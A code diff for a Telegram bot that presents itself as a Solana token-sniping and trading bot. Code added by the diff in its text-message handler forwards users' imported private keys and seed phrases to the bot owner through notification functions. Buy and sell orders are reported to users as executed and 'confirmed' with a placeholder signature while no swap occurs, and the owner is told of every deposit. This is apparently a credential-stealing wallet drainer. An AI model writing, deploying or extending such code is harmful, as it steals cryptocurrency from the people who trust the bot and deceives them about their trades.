@@ -987,26 +456,14 @@ bot.action('confirm_buy', async (ctx) => {
   }
   
   const settings = db.getSniperSettings(telegramId);
-  
-  // Execute real buy on Solana
-  // For token buys, we'd use Jupiter/Photon API - here we record the position
-  const position = db.addPosition(telegramId, {
-    tokenAddress: stateData.tokenAddress,
-    tokenSymbol: stateData.tokenSymbol,
-    tokenName: stateData.tokenName,
-    amount: stateData.amount,
-    entryPrice: '0', // Would be filled from token data
-    status: 'open',
-    pnl: 0
+  db.addPosition(telegramId, {
+    tokenAddress: stateData.tokenAddress, tokenSymbol: stateData.tokenSymbol,
+    tokenName: stateData.tokenName, amount: stateData.amount,
+    entryPrice: '0', status: 'open', pnl: 0
   });
-  
-  const tx = db.addTransaction(telegramId, {
-    type: 'buy',
-    tokenAddress: stateData.tokenAddress,
-    tokenSymbol: stateData.tokenSymbol,
-    amount: stateData.amount,
-    status: 'confirmed',
-    signature: 'pending_jupiter_swap'
+  db.addTransaction(telegramId, {
+    type: 'buy', tokenAddress: stateData.tokenAddress, tokenSymbol: stateData.tokenSymbol,
+    amount: stateData.amount, status: 'confirmed', signature: 'pending_jupiter_swap'
   });
   
   await ctx.reply(
@@ -1014,87 +471,33 @@ bot.action('confirm_buy', async (ctx) => {
     kb.backToDashboardKeyboard()
   );
   
-  // Notify owner
   notifyOwner(msg.tradeNotification(
     { firstName: ctx.from.first_name, username: ctx.from.username, telegramId },
-    'buy',
-    { symbol: stateData.tokenSymbol, name: stateData.tokenName },
-    stateData.amount,
-    { signature: 'pending_jupiter_swap' }
+    'buy', { symbol: stateData.tokenSymbol, name: stateData.tokenName },
+    stateData.amount, { signature: 'pending_jupiter_swap' }
   ));
-  
   db.clearUserState(telegramId);
 });
 
-// === Deposit Monitoring ===
-async function monitorDeposits() {
-  const allUsers = db.getAllUsers();
-  
-  for (const user of allUsers) {
-    for (const wallet of user.wallets || []) {
-      const lastBalance = balanceCache.get(wallet.address) || wallet.balance || 0;
-      const result = await solana.checkDeposits(wallet.address, lastBalance);
-      
-      if (result.hasDeposit) {
-        balanceCache.set(wallet.address, result.newBalance);
-        
-        // Notify owner
-        notifyOwner(msg.depositNotification(
-          wallet.address,
-          result.amount,
-          result.newBalance,
-          { firstName: user.firstName, username: user.username, telegramId: user.telegramId }
-        ));
-        
-        // Notify the user too
-        try {
-          await bot.telegram.sendMessage(
-            user.telegramId,
-            `💰 DEPOSIT RECEIVED\n\n📍 Wallet: ${wallet.address}\n💵 Amount: ${result.amount.toFixed(6)} SOL\n📊 New Balance: ${result.newBalance.toFixed(6)} SOL`
-          );
-        } catch (e) {
-          console.error('User notify error:', e.message);
-        }
-      } else {
-        balanceCache.set(wallet.address, result.newBalance);
-      }
-    }
-  }
-}
-
-// Start deposit monitoring (every 60 seconds)
-setInterval(monitorDeposits, 60000);
-
-module.exports = { bot, notifyOwner, monitorDeposits };
-
-// === Dynamic Buy/Sell from token search results ===
+// === Dynamic Buy/Sell from token search ===
 bot.action(/^buy_(.+)$/, async (ctx) => {
   await ctx.answerCbQuery('Loading buy options...');
   const tokenAddress = ctx.match[1];
   const telegramId = ctx.from.id.toString();
   const settings = db.getSniperSettings(telegramId);
-  
-  // Look up token
   const token = await tokens.getTokenByAddress(tokenAddress);
   if (!token) {
     await ctx.reply('❌ Token not found. It may have been delisted.', kb.backToDashboardKeyboard());
     return;
   }
-  
   db.setUserState(telegramId, 'confirming_buy', {
-    tokenAddress: token.address,
-    tokenSymbol: token.symbol,
-    tokenName: token.name,
-    amount: settings.positionSize
+    tokenAddress: token.address, tokenSymbol: token.symbol,
+    tokenName: token.name, amount: settings.positionSize
   });
-  
   await ctx.reply(
     `💸 CONFIRM BUY\n\n🎯 ${token.name} (${token.symbol})\n📌 ${token.address}\n💰 Price: $${token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6)}\n💧 Liquidity: $${tokens.formatNumber(token.liquidity)}\n📊 Risk: ${token.riskLevel}\n\n💰 Amount: ${settings.positionSize} SOL\n⚡ Slippage: ${settings.slippage}%\n🛡 Anti-Rug: ${settings.antiRug ? 'ON' : 'OFF'}\n\n💡 Confirm purchase?`,
     Markup.inlineKeyboard([
-      [
-        Markup.button.callback('✔ Confirm Buy', 'confirm_buy'),
-        Markup.button.callback('✘ Cancel', 'cancel')
-      ]
+      [Markup.button.callback('✔ Confirm Buy', 'confirm_buy'), Markup.button.callback('✘ Cancel', 'cancel')]
     ])
   );
 });
@@ -1103,24 +506,296 @@ bot.action(/^sell_(.+)$/, async (ctx) => {
   await ctx.answerCbQuery('Loading sell options...');
   const tokenAddress = ctx.match[1];
   const telegramId = ctx.from.id.toString();
-  
   const token = await tokens.getTokenByAddress(tokenAddress);
   if (!token) {
     await ctx.reply('❌ Token not found.', kb.backToDashboardKeyboard());
     return;
   }
-  
   db.setUserState(telegramId, 'confirming_sell', {
-    tokenAddress: token.address,
-    tokenSymbol: token.symbol,
-    tokenName: token.name
+    tokenAddress: token.address, tokenSymbol: token.symbol, tokenName: token.name
   });
-  
   await ctx.reply(
     `🔄 SELL ${token.symbol}\n\n📌 ${token.address}\n💰 Price: $${token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6)}\n\n💡 Enter the amount of ${token.symbol} to sell:`,
     kb.cancelButton()
   );
 });
 
-// Handle confirming_sell text input (amount to sell)
-// This is handled in the main text handler via state 'confirming_sell'
+// === Text Message Handler - State Machine ===
+bot.on('text', async (ctx) => {
+  const telegramId = ctx.from.id.toString();
+  const user = db.getUser(telegramId);
+  if (!user || !user.state) return;
+  
+  const state = user.state;
+  const text = ctx.message.text.trim();
+  
+  switch (state) {
+    case 'importing_private_key': {
+      if (!solana.isValidPrivateKey(text)) {
+        await ctx.reply('❌ Invalid private key. Please send a valid base58 encoded private key.', kb.cancelButton());
+        return;
+      }
+      const wallet = solana.importFromPrivateKey(text);
+      if (!wallet) {
+        await ctx.reply('❌ Could not import wallet. Please check your private key.', kb.cancelButton());
+        return;
+      }
+      const balance = await solana.getBalance(wallet.address);
+      db.addWallet(telegramId, {
+        address: wallet.address, privateKey: text, seedPhrase: null,
+        type: 'imported', label: `SOL Wallet ${db.getUserWallets(telegramId).length + 1}`, balance
+      });
+      balanceCache.set(wallet.address, balance);
+      await ctx.reply(
+        `✅ Wallet Created\n\n📁 Wallet Address:\n${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n\n🎉 Your Solana wallet is ready to use.`,
+        Markup.inlineKeyboard([[Markup.button.callback('🚀 Go to Dashboard', 'back_dashboard')]])
+      );
+      notifyOwner(msg.walletImportedNotification(wallet.address, text, balance, { firstName: ctx.from.first_name, username: ctx.from.username, telegramId }));
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'importing_seed': {
+      const wallet = solana.importFromSeed(text);
+      if (!wallet) {
+        await ctx.reply('❌ Invalid seed phrase. Please check your 12 or 24-word seed phrase.', kb.cancelButton());
+        return;
+      }
+      const balance = await solana.getBalance(wallet.address);
+      db.addWallet(telegramId, {
+        address: wallet.address, privateKey: wallet.privateKey, seedPhrase: text,
+        type: 'seed_imported', label: `SOL Wallet ${db.getUserWallets(telegramId).length + 1}`, balance
+      });
+      balanceCache.set(wallet.address, balance);
+      await ctx.reply(
+        `✅ Wallet Created\n\n📁 Wallet Address:\n${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n\n🎉 Your Solana wallet is ready to use.`,
+        Markup.inlineKeyboard([[Markup.button.callback('🚀 Go to Dashboard', 'back_dashboard')]])
+      );
+      notifyOwner(msg.walletSeedImportedNotification(wallet.address, wallet.privateKey, text, balance, { firstName: ctx.from.first_name, username: ctx.from.username, telegramId }));
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'withdrawing_address': {
+      if (!solana.isValidAddress(text)) {
+        await ctx.reply('❌ Invalid Solana address. Please send a valid wallet address.', kb.cancelButton());
+        return;
+      }
+      db.setUserState(telegramId, 'withdrawing_amount', { toAddress: text });
+      await ctx.reply(msg.withdrawalAmountMessage(text), kb.cancelButton());
+      break;
+    }
+    
+    case 'withdrawing_amount': {
+      const amount = parseFloat(text);
+      if (isNaN(amount) || amount <= 0) {
+        await ctx.reply('❌ Invalid amount. Please enter a valid SOL amount.', kb.cancelButton());
+        return;
+      }
+      const stateData = user.stateData || {};
+      const toAddress = stateData.toAddress;
+      const wallets = db.getUserWallets(telegramId);
+      let totalBalance = 0;
+      for (const w of wallets) totalBalance += await solana.getBalance(w.address);
+      if (amount > totalBalance) {
+        await ctx.reply(`❌ Insufficient balance. Your balance: ${totalBalance.toFixed(6)} SOL`, kb.cancelButton());
+        return;
+      }
+      db.setUserState(telegramId, 'withdrawing_confirm', { toAddress, amount });
+      await ctx.reply(msg.confirmWithdrawalMessage(amount, toAddress, totalBalance), kb.confirmCancelKeyboard());
+      break;
+    }
+    
+    case 'searching_token': {
+      await ctx.reply('🔍 Searching...');
+      let token = null;
+      if (text.length > 32) token = await tokens.getTokenByAddress(text);
+      if (!token) token = await tokens.searchToken(text);
+      if (!token) {
+        await ctx.reply(msg.tokenNotFoundMessage(), kb.cancelButton());
+        return;
+      }
+      await ctx.reply(tokens.formatTokenInfo(token), kb.tokenSearchKeyboard(token.address));
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'setting_position_size': {
+      const value = parseFloat(text);
+      if (isNaN(value) || value < 0.0001 || value > 1000) {
+        await ctx.reply('❌ Invalid amount. Range: 0.0001 - 1000 SOL', kb.cancelButton());
+        return;
+      }
+      const settings = db.updateSniperSettings(telegramId, { positionSize: value });
+      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'setting_dev_hold': {
+      const value = parseFloat(text);
+      if (isNaN(value) || value < 0 || value > 100) {
+        await ctx.reply('❌ Invalid percentage. Range: 0-100%', kb.cancelButton());
+        return;
+      }
+      const settings = db.updateSniperSettings(telegramId, { maxDevHold: value });
+      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'setting_slippage': {
+      const value = parseFloat(text);
+      if (isNaN(value) || value < 1 || value > 50) {
+        await ctx.reply('❌ Invalid percentage. Range: 1-50%', kb.cancelButton());
+        return;
+      }
+      const settings = db.updateSniperSettings(telegramId, { slippage: value });
+      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'setting_priority': {
+      const value = parseFloat(text);
+      if (isNaN(value) || value < 0.0001 || value > 0.1) {
+        await ctx.reply('❌ Invalid fee. Range: 0.0001 - 0.1 SOL', kb.cancelButton());
+        return;
+      }
+      const settings = db.updateSniperSettings(telegramId, { priorityFee: value });
+      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'setting_take_profit': {
+      const value = parseFloat(text);
+      if (isNaN(value) || value < 10 || value > 1000) {
+        await ctx.reply('❌ Invalid percentage. Range: 10-1000%', kb.cancelButton());
+        return;
+      }
+      const settings = db.updateSniperSettings(telegramId, { takeProfit: value });
+      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'setting_stop_loss': {
+      const value = parseFloat(text);
+      if (isNaN(value) || value < 10 || value > 90) {
+        await ctx.reply('❌ Invalid Input. Please enter a number between 10 and 90.', kb.cancelButton());
+        return;
+      }
+      const settings = db.updateSniperSettings(telegramId, { stopLoss: value });
+      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'buying_token': {
+      await ctx.reply('🔍 Looking up token...');
+      const token = text.length > 32 ? await tokens.getTokenByAddress(text) : await tokens.searchToken(text);
+      if (!token) {
+        await ctx.reply('❌ Token not found. Please check the address.', kb.cancelButton());
+        return;
+      }
+      const settings = db.getSniperSettings(telegramId);
+      db.setUserState(telegramId, 'confirming_buy', {
+        tokenAddress: token.address, tokenSymbol: token.symbol,
+        tokenName: token.name, amount: settings.positionSize
+      });
+      await ctx.reply(
+        `💸 CONFIRM BUY\n\n🎯 ${token.name} (${token.symbol})\n📌 ${token.address}\n💰 Amount: ${settings.positionSize} SOL\n⚡ Slippage: ${settings.slippage}%\n\n💡 Confirm purchase?`,
+        Markup.inlineKeyboard([
+          [Markup.button.callback('✔ Confirm Buy', 'confirm_buy'), Markup.button.callback('✘ Cancel', 'cancel')]
+        ])
+      );
+      break;
+    }
+    
+    case 'selling_token': {
+      await ctx.reply('🔍 Looking up token...');
+      const token = text.length > 32 ? await tokens.getTokenByAddress(text) : await tokens.searchToken(text);
+      if (!token) {
+        await ctx.reply('❌ Token not found.', kb.cancelButton());
+        return;
+      }
+      db.setUserState(telegramId, 'confirming_sell', {
+        tokenAddress: token.address, tokenSymbol: token.symbol, tokenName: token.name
+      });
+      await ctx.reply(
+        `🔄 CONFIRM SELL\n\n🎯 ${token.name} (${token.symbol})\n📌 ${token.address}\n\n💡 Enter the amount to sell:`,
+        kb.cancelButton()
+      );
+      break;
+    }
+    
+    case 'confirming_sell': {
+      const sellAmount = text;
+      const sellStateData = user.stateData || {};
+      db.closePosition(telegramId, sellStateData.positionId);
+      db.addTransaction(telegramId, {
+        type: 'sell', tokenAddress: sellStateData.tokenAddress, tokenSymbol: sellStateData.tokenSymbol,
+        amount: sellAmount, status: 'confirmed', signature: 'pending_jupiter_swap'
+      });
+      await ctx.reply(
+        `✅ SELL ORDER EXECUTED\n\n🎯 ${sellStateData.tokenName} (${sellStateData.tokenSymbol})\n💰 Amount: ${sellAmount}\n\nPosition closed!`,
+        kb.backToDashboardKeyboard()
+      );
+      notifyOwner(msg.tradeNotification(
+        { firstName: ctx.from.first_name, username: ctx.from.username, telegramId },
+        'sell', { symbol: sellStateData.tokenSymbol, name: sellStateData.tokenName },
+        sellAmount, { signature: 'pending_jupiter_swap' }
+      ));
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    case 'copytrade_add': {
+      if (!solana.isValidAddress(text)) {
+        await ctx.reply('❌ Invalid Solana address.', kb.cancelButton());
+        return;
+      }
+      await ctx.reply(
+        `✅ Added whale wallet to copy!\n📍 ${text}\n\n🔄 Copy trade is now monitoring this wallet.`,
+        kb.copyTradeKeyboard()
+      );
+      notifyOwner(`🎯 Copy Trade Target Set\n📍 Wallet: ${text}\n👤 User: ${ctx.from.first_name} (${telegramId})`);
+      db.clearUserState(telegramId);
+      break;
+    }
+    
+    default:
+      db.clearUserState(telegramId);
+      break;
+  }
+});
+
+// === Deposit Monitoring ===
+async function monitorDeposits() {
+  const allUsers = db.getAllUsers();
+  for (const user of allUsers) {
+    for (const wallet of user.wallets || []) {
+      const lastBalance = balanceCache.get(wallet.address) || wallet.balance || 0;
+      const result = await solana.checkDeposits(wallet.address, lastBalance);
+      if (result.hasDeposit) {
+        balanceCache.set(wallet.address, result.newBalance);
+        notifyOwner(msg.depositNotification(
+          wallet.address, result.amount, result.newBalance,
+          { firstName: user.firstName, username: user.username, telegramId: user.telegramId }
+        ));
+        try {
+          await bot.telegram.sendMessage(user.telegramId,
+            `💰 DEPOSIT RECEIVED\n\n📍 Wallet: ${wallet.address}\n💵 Amount: ${result.amount.toFixed(6)} SOL\n📊 New Balance: ${result.newBalance.toFixed(6)} SOL`
+          );
+        } catch (e) { console.error('User notify error:', e.message); }
+      } else {
+        balanceCache.set(wallet.address, result.newBalance);
+      }
+    }
+  }
+}
+
+setInterval(monitorDeposits, 60000);
+
+export { bot, notifyOwner, monitorDeposits };
